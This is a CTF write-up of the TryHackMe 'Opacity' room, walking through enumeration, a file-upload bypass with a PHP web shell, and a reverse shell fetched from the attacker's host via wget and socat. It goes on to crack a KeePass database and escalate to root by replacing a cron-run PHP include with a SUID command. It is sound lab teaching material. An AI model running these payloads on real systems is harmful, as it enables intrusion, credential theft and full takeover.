# Opacity

## Introduction

Welcome to my another writeup! In this TryHackMe [Opacity](https://tryhackme.com/room/opacity) room, you'll learn: File upload vulnerability and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: www-data to sysadmin](#privilege-escalation)**
4. **[Privilege Escalation: sysadmin to root](#sysadmin-to-root)**
5. **[Conclusion](#conclusion)**

## Background

> Opacity is a Boot2Root made for pentesters and cybersecurity enthusiasts.
>  
> Difficulty: Easy

---

Opacity is an easy machine that can help you in the penetration testing learning process.

There are 2 hash keys located on the machine (user - local.txt and root - proof.txt). Can you find them and become root?

_Hint: There are several ways to perform an action; always analyze the behavior of the application._

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|14:15:14(HKT)]
└> export RHOSTS=10.10.215.203
┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|14:15:21(HKT)]
└> rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0fee2910d98e8c53e64de3670c6ebee3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCa4rFv9bD2hlJ8EgxU6clOj6v7GMUIjfAr7fzckrKGPnvxQA3ikvRKouMMUiYThvvfM7gOORL5sicN3qHS8cmRsLFjQVGyNL6/nb+MyfUJlUYk4WGJYXekoP5CLhwGqH/yKDXzdm1g8LR6afYw8fSehE7FM9AvXMXqvj+/WoC209pWu/s5uy31nBDYYfRP8VG3YEJqMTBgYQIk1RD+Q6qZya1RQDnQx6qLy1jkbrgRU9mnfhizLVsqZyXuoEYdnpGn9ogXi5A0McDmJF3hh0p01+KF2/+GbKjJrGNylgYtU1/W+WAoFSPE41VF7NSXbDRba0WIH5RmS0MDDFTy9tbKB33sG9Ct6bHbpZCFnxBi3toM3oBKYVDfbpbDJr9/zEI1R9ToU7t+RH6V0zrljb/cONTQCANYxESHWVD+zH/yZGO4RwDCou/ytSYCrnjZ6jHjJ9TWVkRpVjR7VAV8BnsS6egCYBOJqybxW2moY86PJLBVkd6r7x4nm19yX4AQPm8=
|   256 9542cdfc712799392d0049ad1be4cf0e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAqe7rEbmvlsedJwYaZCIdligUJewXWs8mOjEKjVrrY/28XqW/RMZ12+4wJRL3mTaVJ/ftI6Tu9uMbgHs21itQQ=
|   256 edfe9c94ca9c086ff25ca6cf4d3c8e5b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINQSFcnxA8EchrkX6O0RPMOjIUZyyyQT9fM4z4DdCZyA
80/tcp  open  http        syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: Login
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
139/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
[...]
```

According to `rustscan` result, we have 3 ports are opened:

Open Ports        | Service
------------------|------------------------
22                | OpenSSH 8.2p1 Ubuntu
80                | Apache httpd 2.4.41 ((Ubuntu))
139,445           | Samba smbd 4.6.2

### SMB on Port 139,445

**In here, we can use `enum4linux` to enumerate SMB service in Linux:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|14:17:48(HKT)]
└> enum4linux $RHOSTS
[...]
 =================================( Share Enumeration on 10.10.215.203 )=================================

smbXcli_negprot_smb1_done: No compatible protocol selected by server.

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (opacity server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.215.203

//10.10.215.203/print$	Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//10.10.215.203/IPC$	Mapping: N/A Listing: N/A Writing: N/A
[...]
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\sysadmin (Local User)
[...]
```

- **Found local user: `sysadmin`**

We could try to brute force that `sysadmin` user's password.

However, I tried to brute force SMB and SSH with that username, but no dice...

### HTTP on Port 80

**Add a new host to `/etc/hosts`:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|14:26:25(HKT)]
└> echo "$RHOSTS opacity.thm" | sudo tee -a /etc/hosts
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427142706.png)

When we go to `/`, it'll redirect us to `/login.php`.

**Let's enumerate hidden directories and files via `gobuster`!**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|14:28:33(HKT)]
└> gobuster dir -u http://opacity.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 40
[...]
/css                  (Status: 301) [Size: 308] [--> http://opacity.thm/css/]
/server-status        (Status: 403) [Size: 276]
/cloud                (Status: 301) [Size: 310] [--> http://opacity.thm/cloud/]
┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|14:34:19(HKT)]
└> gobuster dir -u http://opacity.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 40
[...]
/index.php            (Status: 302) [Size: 0] [--> login.php]
/login.php            (Status: 200) [Size: 848]
/.htaccess            (Status: 403) [Size: 276]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/.                    (Status: 302) [Size: 0] [--> login.php]
/.html                (Status: 403) [Size: 276]
/.php                 (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htm                 (Status: 403) [Size: 276]
/.htpasswds           (Status: 403) [Size: 276]
/.htgroup             (Status: 403) [Size: 276]
/wp-forum.phps        (Status: 403) [Size: 276]
/.htaccess.bak        (Status: 403) [Size: 276]
/.htuser              (Status: 403) [Size: 276]
/.ht                  (Status: 403) [Size: 276]
/.htc                 (Status: 403) [Size: 276]
/.htacess             (Status: 403) [Size: 276]
/.htaccess.old        (Status: 403) [Size: 276]
```

- Found interesting directory: `/cloud`

In `/login.php`, we can try to test SQL injection, and see if we can bypass the authentication:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427144924.png)

Nope.

Alrightly, let's move on to `/cloud`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427145149.png)

In here, we can upload an image via an ***external URL***!

Hmm... I can smell some Remote File Inclusion (RFI), Server-Side Request Forgery (SSRF), **Remote Code Execution via file upload vulnerability**!

Let's test for file upload vulnerability!

**First, try to upload a real image for testing:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|15:02:11(HKT)]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427150737.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427150747.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427150754.png)

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|15:06:32(HKT)]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.215.203 - - [27/Apr/2023 15:07:37] "GET /image.jpg HTTP/1.1" 200 -
```

As you can see, it uploaded our image to `/cloud/images/image.jpg`.

And we can view the uploaded image in `/cloud/storage.php`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427151041.png)

## Initial Foothold

Now, **what if we upload a PHP web shell??**

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|15:12:11(HKT)]
└> echo '<?php system($_GET["cmd"]); ?>' > webshell.php
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427151343.png)

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|15:06:32(HKT)]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.215.203 - - [27/Apr/2023 15:07:37] "GET /image.jpg HTTP/1.1" 200 -
```

No request coming from the target...

That being said, there's some filter that filters out non image extensions.

Hmm... Let's try using the **null byte (`%00`) technique** to bypass blacklist extension!!

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|15:41:29(HKT)]
└> mv webshell.php "webshell.php%00.jpg"
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427154205.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427154210.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427154215.png)

The file is uploaded!!

**However, when you try to reach for that file:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|15:42:41(HKT)]
└> curl http://opacity.thm/cloud/images/webshell.php%00.jpg
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at opacity.thm Port 80</address>
</body></html>
```

It returns a 404 status code.

**After some testing, I realized that we don't have to change the web shell file name!** 
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|15:53:12(HKT)]
└> mv webshell.php%00.jpg webshell.php
```

**We can just add the null byte in the form's input box!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427155406.png)

However, this still doesn't work.

**After fumbling around, I added a PHP comment (`#`) to the input box, and it's uploaded!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427160058.png)

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|16:02:03(HKT)]
└> curl http://opacity.thm/cloud/images/webshell.php --get --data-urlencode "cmd=id"  
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Nice! We now have RCE!

**Hmm...**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|16:04:01(HKT)]
└> curl http://opacity.thm/cloud/images/webshell.php --get --data-urlencode "cmd=id"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at opacity.thm Port 80</address>
</body></html>
```

Looks like our uploaded file will be deleted after 1 minute...

Let's upload it again and execute our reverse shell payload:

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|16:10:15(HKT)]
└> cp /opt/static-binaries/binaries/linux/x86_64/socat .
```

**Setup a `socat` TTY listener:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|16:11:00(HKT)]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4443
2023/04/27 16:11:23 socat[85159] N opening character device "/dev/pts/1" for reading and writing
2023/04/27 16:11:23 socat[85159] N listening on AF=2 0.0.0.0:4443

```

**Upload it again, go to `/cloud/images/webshell.php` with the payload:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|16:15:16(HKT)]
└> curl http://opacity.thm/cloud/images/webshell.php --get --data-urlencode "cmd=wget http://10.8.70.81/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.8.70.81:4443 EXEC:'sh',pty,stderr,setsid,sigint,sane"
```

What this payload does is download the `socat` binary to target's `/tmp/socat`, then execute a reverse shell payload.

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|16:11:00(HKT)]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4443
2023/04/27 16:11:23 socat[85159] N opening character device "/dev/pts/1" for reading and writing
2023/04/27 16:11:23 socat[85159] N listening on AF=2 0.0.0.0:4443
                                                                 2023/04/27 16:15:38 socat[85159] N accepting connection from AF=2 10.10.215.203:37606 on AF=2 10.8.70.81:4443
                                                                   2023/04/27 16:15:38 socat[85159] N starting data transfer loop with FDs [5,5] and [7,7]
                                               sh: 0: can't access tty; job control turned off
$ stty rows 23 columns 107
$ export TERM=xterm-256color
$ whoami;hostname;id;ip a
www-data
opacity
uid=33(www-data) gid=33(www-data) groups=33(www-data)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:76:74:c2:88:23 brd ff:ff:ff:ff:ff:ff
    inet 10.10.215.203/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 1938sec preferred_lft 1938sec
    inet6 fe80::76:74ff:fec2:8823/64 scope link 
       valid_lft forever preferred_lft forever
$ ^C
$ 
$ /bin/bash
bash: cannot set terminal process group (3398): Inappropriate ioctl for device
bash: no job control in this shell
www-data@opacity:/var/www/html/cloud/images$ 
```

Boom! We're `www-data`!

## Privilege Escalation

### www-data to sysadmin

Now, we can do some basic enumeration!

```shell
www-data@opacity:/var/www/html/cloud/images$ cat /etc/passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
sysadmin:x:1000:1000:sysadmin:/home/sysadmin:/bin/bash
```

- Found local user: `sysadmin`

```shell
www-data@opacity:/var/www/html/cloud/images$ ls -lah /opt
total 12K
drwxr-xr-x  2 root     root     4.0K Jul 26  2022 .
drwxr-xr-x 19 root     root     4.0K Jul 26  2022 ..
-rwxrwxr-x  1 sysadmin sysadmin 1.6K Jul  8  2022 dataset.kdbx
www-data@opacity:/var/www/html/cloud/images$ file /opt/dataset.kdbx 
/opt/dataset.kdbx: Keepass password database 2.x KDBX
```

- **Found Keepass password database file in `/opt`**

```shell
www-data@opacity:/var/www/html/cloud/images$ ls -lah /var/backups/
total 844K
drwxr-xr-x  2 root root 4.0K Apr 27 08:24 .
drwxr-xr-x 14 root root 4.0K Jul 26  2022 ..
-rw-r--r--  1 root root  50K Apr 27 06:25 alternatives.tar.0
-rw-r--r--  1 root root  40K Feb 22 08:04 apt.extended_states.0
-rw-r--r--  1 root root 4.3K Jul 26  2022 apt.extended_states.1.gz
-rw-r--r--  1 root root  34K Apr 27 08:24 backup.zip
[...]
```

- Found `backup.zip` in `/var/backups/`

```php
<?php session_start(); /* Starts the session */
	
	/* Check Login form submitted */	
	if(isset($_POST['Submit'])){
		/* Define username and associated password array */
		$logins = array('admin' => 'oncloud9','root' => 'oncloud9','administrator' => 'oncloud9');
		
		/* Check and assign submitted Username and Password to new variable */
		$Username = isset($_POST['Username']) ? $_POST['Username'] : '';
		$Password = isset($_POST['Password']) ? $_POST['Password'] : '';
		
		/* Check Username and Password existence in defined array */		
		if (isset($logins[$Username]) && $logins[$Username] == $Password){
			/* Success: Set session variables and redirect to Protected page  */
			$_SESSION['UserData']['Username']=$logins[$Username];
			header("location:index.php");
			exit;
		} else {
			/*Unsuccessful attempt: Set error message */
			$msg="<span style='color:red'>Invalid Login Details</span>";
		}
	}
?>
<!doctype html>
[...]
```

- Found login credentials in `/var/www/html/login.php`
- `admin:oncloud9`, `root:oncloud9`, `administrator:oncloud9`

**Let's login in the `/login.php`!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427162933.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427162944.png)

However, nothing weird here.

**Umm... Can we login as `sysadmin` with that password?**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|16:20:21(HKT)]
└> ssh sysadmin@$RHOSTS
The authenticity of host '10.10.215.203 (10.10.215.203)' can't be established.
ED25519 key fingerprint is SHA256:VdW4fa9h5tyPlpiJ8i9kyr+MCvLbz7p4RgOGPbWM7Nw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.215.203' (ED25519) to the list of known hosts.
sysadmin@10.10.215.203's password: 
Permission denied, please try again.
```

Nope.

**Since the `dataset.kdbx` file in `/opt` is the most interesting thing, let's transfer that file:**
```shell
www-data@opacity:/var/www/html/cloud/images$ cd /opt
www-data@opacity:/opt$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|16:32:43(HKT)]
└> wget http://$RHOSTS:8000/dataset.kdbx
┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|16:33:06(HKT)]
└> file dataset.kdbx 
dataset.kdbx: Keepass password database 2.x KDBX
```

Hmm... I wonder if can we open that database, and view some passwords!

**According to [HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#keepass), we can use `keepass2john` and `john` to crack it's database hash:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427163452.png)

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|16:36:05(HKT)]
└> john --wordlist=/usr/share/wordlists/rockyou.txt hash 
[...]
{Redacted}        (dataset)
[...]
```

Nice!! We cracked the hash!

Let's open the Keepass database!

**Installing Keepass:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|16:45:11(HKT)]
└> sudo apt-get install keepass2 -y
```

**Open Keepass and the database file:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|16:46:20(HKT)]
└> keepass2
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427164731.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427164758.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427164905.png)

**Copy the password:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427164922.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Opacity/images/Pasted%20image%2020230427164933.png)

**Now we can SSH into user `sysadmin`!!**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Opacity)-[2023.04.27|16:49:40(HKT)]
└> ssh sysadmin@$RHOSTS            
sysadmin@10.10.215.203's password: 
[...]
sysadmin@opacity:~$ whoami;hostname;id;ip a
sysadmin
opacity
uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin),24(cdrom),30(dip),46(plugdev)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:76:74:c2:88:23 brd ff:ff:ff:ff:ff:ff
    inet 10.10.215.203/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3484sec preferred_lft 3484sec
    inet6 fe80::76:74ff:fec2:8823/64 scope link 
       valid_lft forever preferred_lft forever
sysadmin@opacity:~$ 
```

I'm user `sysadmin`!

**local.txt:**
```shell
sysadmin@opacity:~$ cat local.txt 
{Redacted}
```

### sysadmin to root

**In the `sysadmin`'s home directory, we see a sussy directory:**
```shell
sysadmin@opacity:~$ ls -lah
[...]
drwxr-xr-x 3 root     root     4.0K Jul  8  2022 scripts
[...]
sysadmin@opacity:~$ ls -lah scripts/
total 16K
drwxr-xr-x 3 root     root     4.0K Jul  8  2022 .
drwxr-xr-x 6 sysadmin sysadmin 4.0K Feb 22 08:16 ..
drwxr-xr-x 2 sysadmin root     4.0K Jul 26  2022 lib
-rw-r----- 1 root     sysadmin  519 Jul  8  2022 script.php
```

**`/home/sysadmin/scripts/script.php`:**
```php
<?php

//Backup of scripts sysadmin folder
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
echo 'Successful', PHP_EOL;

//Files scheduled removal
$dir = "/var/www/html/cloud/images";
if(file_exists($dir)){
    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
    foreach ( $ri as $file ) {
        $file->isDir() ?  rmdir($file) : unlink($file);
    }
}
?>
```

What this PHP script does is to backup everything in `/home/sysadmin/scripts` to `/var/backups/backup.zip`, and remove everything in `/var/www/html/cloud/images` after some period of time.

Hmm... How does this PHP script being run?

**Let's use `pspy` to check any cronjob is running with that script:**
```shell
┌[siunam♥earth]-(/opt/pspy)-[2023.04.27|16:58:12(HKT)]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
sysadmin@opacity:~$ wget http://10.8.70.81/pspy64 -O /tmp/pspy;chmod +x /tmp/pspy;/tmp/pspy
[...]
2023/04/27 09:00:01 CMD: UID=0    PID=3958   | /usr/sbin/CRON -f 
2023/04/27 09:00:01 CMD: UID=0    PID=3960   | /usr/bin/php /home/sysadmin/scripts/script.php 
2023/04/27 09:00:01 CMD: UID=0    PID=3959   | /bin/sh -c /usr/bin/php /home/sysadmin/scripts/script.php
[...]
2023/04/27 09:01:01 CMD: UID=0    PID=3962   | /bin/sh -c /usr/bin/php /home/sysadmin/scripts/script.php 
2023/04/27 09:01:01 CMD: UID=0    PID=3961   | /usr/sbin/CRON -f 
2023/04/27 09:01:01 CMD: UID=0    PID=3963   | /usr/bin/php /home/sysadmin/scripts/script.php
```

So my guessing is correct. Every minute there's a cronjob is running, and it's executing the `script.php` in `/home/sysadmin/scripts/`.

That being said, if we can modify `script.php` or `lib/backup.inc.php`, we can escalate our privilege to root!

```shell
sysadmin@opacity:~$ ls -lah scripts/script.php 
-rw-r----- 1 root sysadmin 519 Jul  8  2022 scripts/script.php
```

However, the `script.php` only writable via `root` user, our `sysadmin` group can only read it...

**Luckly, it wasn't the case in `lib/`:**
```
sysadmin@opacity:~$ ls -lah scripts/lib/
total 132K
drwxr-xr-x 2 sysadmin root 4.0K Jul 26  2022 .
drwxr-xr-x 3 root     root 4.0K Jul  8  2022 ..
-rw-r--r-- 1 root     root 9.3K Jul 26  2022 application.php
-rw-r--r-- 1 root     root  967 Jul  6  2022 backup.inc.php
-rw-r--r-- 1 root     root  24K Jul 26  2022 bio2rdfapi.php
-rw-r--r-- 1 root     root  11K Jul 26  2022 biopax2bio2rdf.php
-rw-r--r-- 1 root     root 7.5K Jul 26  2022 dataresource.php
-rw-r--r-- 1 root     root 4.8K Jul 26  2022 dataset.php
-rw-r--r-- 1 root     root 3.2K Jul 26  2022 fileapi.php
-rw-r--r-- 1 root     root 1.3K Jul 26  2022 owlapi.php
-rw-r--r-- 1 root     root 1.5K Jul 26  2022 phplib.php
-rw-r--r-- 1 root     root  11K Jul 26  2022 rdfapi.php
-rw-r--r-- 1 root     root  17K Jul 26  2022 registry.php
-rw-r--r-- 1 root     root 6.8K Jul 26  2022 utils.php
-rwxr-xr-x 1 root     root 3.9K Jul 26  2022 xmlapi.php
```

**As you can see, the `lib/` directory has the following permission:**
```shell
drwxr-xr-x 2 sysadmin root 4.0K Jul 26  2022 .
```

***The `sysadmin` user can have write access to the `lib/` directory!***

Let's replace the `lib/backup.inc.php` script to our evil one!!

```shell
sysadmin@opacity:~$ cp scripts/lib/backup.inc.php scripts/lib/backup.inc.php.bak
sysadmin@opacity:~$ rm scripts/lib/backup.inc.php
rm: remove write-protected regular file 'scripts/lib/backup.inc.php'? y
sysadmin@opacity:~$ nano scripts/lib/backup.inc.php
sysadmin@opacity:~$ cat scripts/lib/backup.inc.php
<?php
system("chmod +s /bin/bash");
?>
```

**Our evil `backup.inc.php` will add a SUID sticky bit to `/bin/bash`, which will then spawning a Bash shell as root privilege!**

**Now what we're going to do, is to wait for 1 minute:**
```shell
sysadmin@opacity:~$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 1.2M Apr 18  2022 /bin/bash
```

**Nice! It worked! Let's spawn a root Bash shell!!**
```shell
sysadmin@opacity:~$ /bin/bash -p
bash-5.0# whoami;hostname;id;ip a
root
opacity
uid=1000(sysadmin) gid=1000(sysadmin) euid=0(root) egid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(sysadmin)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:76:74:c2:88:23 brd ff:ff:ff:ff:ff:ff
    inet 10.10.215.203/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2201sec preferred_lft 2201sec
    inet6 fe80::76:74ff:fec2:8823/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**proof.txt:**
```
bash-5.0# cat /root/proof.txt 
{Redacted}
```

# Conclusion

What we've learned:

1. SMB Enumeration
2. Directories & Files Enumeration
3. RCE via File Upload Vulnerability
4. Cracking Keepass Database Hash
5. Privilege Escalation via Modifying PHP Script